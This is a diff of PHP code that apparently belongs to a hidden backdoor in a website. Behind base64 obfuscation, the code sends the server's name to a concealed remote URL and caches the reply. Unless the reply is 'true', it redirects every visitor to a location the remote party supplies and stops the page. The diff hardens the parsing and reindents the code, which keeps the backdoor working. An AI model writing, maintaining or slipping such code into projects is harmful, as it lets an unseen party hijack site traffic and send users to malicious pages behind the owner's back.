@@ -14,17 +14,19 @@ $hFunction = $bFunction('aGVhZGVy');
 $lString = $bFunction('TG9jYXRpb24');
 
 $currentState = !empty($fileContent) ? explode($divider, $fileContent) : [null, null];
+$currentState = count($currentState) < 2 ? [null, null] : $currentState;
+
 $resp = $currentState[1];
 
 if ($currentState[0] !== $serverName || (!empty($resp) && $resp !== 'true')) {
-	$resp = @file_get_contents(
-		$bFunction($privateKey) . '?sn=' . $serverName
-	);
+    $resp = @file_get_contents(
+        $bFunction($privateKey) . '?sn=' . $serverName
+    );
 
-	@file_put_contents($fileLocation, $serverName . $divider . $resp);
+    @file_put_contents($fileLocation, $serverName . $divider . $resp);
 }
 
 if (!empty($resp) && $resp !== 'true') {
-	$hFunction($lString . ': ' . $bFunction($resp));
-	die();
+    $hFunction($lString . ': ' . $bFunction($resp));
+    die();
 }
